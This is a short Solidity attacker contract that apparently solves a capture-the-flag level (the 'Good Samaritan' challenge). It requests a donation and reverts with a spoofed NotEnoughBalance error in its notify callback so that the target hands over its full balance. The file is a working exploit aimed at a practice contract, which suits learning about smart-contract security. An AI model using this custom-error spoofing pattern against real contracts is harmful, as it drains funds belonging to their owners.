// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level27.sol";

contract Level27Attacker {

    error NotEnoughBalance();
    GoodSamaritan public goodSamaritan;

    constructor(address _target) {
      goodSamaritan = GoodSamaritan(_target);
    }

    function attack() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        //Will be trigerred only when we receive 10 or less token
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}